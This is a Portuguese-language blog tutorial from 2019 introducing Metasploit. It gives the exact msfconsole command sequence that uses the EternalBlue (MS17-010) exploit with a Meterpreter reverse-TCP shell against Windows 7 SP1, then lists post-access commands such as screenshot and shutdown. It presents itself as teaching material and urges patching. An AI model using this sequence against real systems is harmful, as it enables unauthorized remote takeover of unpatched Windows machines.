terça-feira, 23 de abril de 2019O Metasploit é uma ferramenta usada por pentesters para avaliar as capacidade de segurança de um sistema, fazer invasões e também detectar intrusos. É uma ferramenta muito comum em distribuições Linux voltadas para este meio, como o Kali Linux. Hoje você vai conhecer uma de suas facetas.O Metasploit é um projeto de segurança da informação que fornece informações sobre vulnerabilidades de segurança e ajuda nos testes de penetração. É de propriedade da empresa de segurança Rapid7, de Boston, Massachusetts, que possui diversos softwares (Opcode - Banco de Dados ; e o Shellcode , que executa comandos deShell Script... ), entre eles o mais conhecido é o Metasploit Framework, um software de código aberto para explorar falhas de uma máquina remota.O Metasploit possui 6 tipos de módulos (auxiliary, exploit, payload, post, encoder e nop) . No vídeo apresentado por nós, vamos utilizar o Meterpreter que é um payload avançado.InstalaçãoExistem diversas maneiras de você instalar o Metasploit Framework. Baixando diretamente pelo site ou pelo GitHub.Para quem gosta de fazer manualmente, é possível instalá-lo via gerenciador de pacotes da sua distribuição, por exemplo, na distribuição Ubuntu, Linux Mint, Debian e derivados basta realizar os comandos abaixo:Lembrando que em algumas distribuições já possuem o Metasploit instalado por padrão, como o Pentoo e o Kali Linux, entre outras criadas especialmente para testes de invasão.O Próximo passo é rodar o Metasploit por este comando:msfconsoleIsso irá abrir o framework, e em seguida usaremos o Meterpreter para acessar o Windows , basta rodar os comandos abaixo na ordem:use exploit/windows/smb/ms17_010_eternalblueset RHOST NÚMERO_IP_DA_MÁQUINA_WINDOWSset payload windows/x64/meterpreter/reverse_tcpset LHOST NÚMERO_IP_DA_SUA_MÁQUINAset encoder generic/noneexploitLembrando que esses comandos são "a grosso modo", e servem para Windows 7 Service Pack 1 , para outras versões assista o vídeo com link abaixo que há mais detalhes para variados casos.Após acessar você pode obter informações detalhadas do sistema com o comando sysinfo; tirar um print da tela com o comando screenshot ; saber qual diretório você está com o comando pwd a saída será algo do tipo *c:32* ; desligar, reiniciar,... entre vários comandos que podem ser consultados pelo comando help .Confira o exemplo no vídeo:Esse artigo e o vídeo apresentado foram criados com finalidade didática, mantenha o seu Windows atualizado para evitar ser exposto a coisas do tipo. A falha explorada neste exemplo, por exemplo, já foi corrigida pela Microsoft, daí a importância de manter os sistemas sempre atualizados.Se você ainda não domina Shell Script e o Terminal Linux. Aproveite uma promoção onde você pode adquirir 5 cursos de terminal Linux, incluindo Shell Script, Expressões Regulares, Vim e Sed.Esse artigo foi escrito em parceria com a galera do Terminal Root, os quais são os autores dos cursos mencionados acima, até a próxima!_____________________________________________________________________________
Viu algum erro ou gostaria de adicionar alguma sugestão a essa matéria? Colabore, clique aqui.